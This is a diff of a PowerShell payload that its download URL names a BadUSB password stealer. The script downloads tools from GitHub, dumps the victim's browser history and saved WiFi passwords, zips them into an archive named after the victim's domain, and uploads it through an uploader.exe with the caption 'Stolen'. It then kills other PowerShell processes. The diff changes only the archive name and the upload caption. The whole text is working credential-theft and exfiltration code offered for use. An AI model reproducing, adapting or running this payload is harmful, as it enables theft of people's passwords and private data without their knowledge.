@@ -9,9 +9,9 @@ Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_fi
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext dust_history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext dust_wifi.txt #Create the file for WiFi passwords
 Start-Sleep -Seconds 10 #Wait for 60 seconds (because connected devices file take a minute to be created)
-Compress-Archive dust_* dusted.zip
+Compress-Archive dust_* "$env:UserDomain$(Get-Date -Format yyyymmdd).zip"
 Start-Sleep -Seconds 5
-.\uploader.exe -f dusted.zip -c "Stolen $env:UserDomain"
+.\uploader.exe -f "$env:UserDomain$(Get-Date -Format yyyymmdd).zip" -c "Stolen $env:UserDomain on $(Get-Date -Format yyyy-mm-dd)"
 Start-Sleep -Seconds 20 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 15 #Wait 30 seconds
